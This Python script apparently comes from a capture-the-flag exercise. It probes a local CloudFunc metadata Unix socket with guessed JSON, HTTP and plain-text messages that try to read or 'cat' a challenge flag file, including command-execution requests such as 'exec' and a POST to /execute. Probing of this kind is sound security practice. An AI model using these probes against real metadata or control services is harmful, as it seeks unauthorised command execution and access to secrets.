#!/usr/bin/env python3
"""Interact with CloudFunc metadata socket"""
import socket
import json
import os

SOCK_PATH = "/run/cloudfunc/metadata.sock"

def query(msg):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect(SOCK_PATH)
        s.send(msg)
        resp = b""
        while True:
            try:
                d = s.recv(4096)
                if not d:
                    break
                resp += d
            except:
                break
        s.close()
        return resp
    except Exception as e:
        return f"Error: {e}".encode()

# Try various protocols
tests = [
    (b"", "Empty"),
    (b"HELP\n", "HELP text"),
    (b'{"action":"get","path":"/challenge/flag.txt"}\n', "JSON get flag"),
    (b'{"action":"exec","cmd":"cat /challenge/flag.txt"}\n', "JSON exec"),
    (b'{"action":"read","file":"/challenge/flag.txt"}\n', "JSON read"),
    (b'GET /challenge/flag.txt HTTP/1.0\r\n\r\n', "HTTP GET flag"),
    (b'GET / HTTP/1.0\r\nHost: metadata\r\n\r\n', "HTTP GET root"),
    (b"FLAG\n", "FLAG"),
    (b"flag\n", "flag"),
    (b"get /challenge/flag.txt\n", "get flag"),
    (b"execute cat /challenge/flag.txt\n", "execute"),
    (b"run cat /challenge/flag.txt\n", "run"),
    (b"deploy\n", "deploy"),
    (b"list\n", "list"),
    (b"status\n", "status"),
]

for msg, desc in tests:
    resp = query(msg)
    print(f"[{desc}] -> {repr(resp[:200])}")

# Also try HTTP POST
resp = query(b'POST /execute HTTP/1.0\r\nContent-Type: application/json\r\nContent-Length: 45\r\n\r\n{"code":"cat /challenge/flag.txt"}')
print(f"[HTTP POST] -> {repr(resp[:200])}")
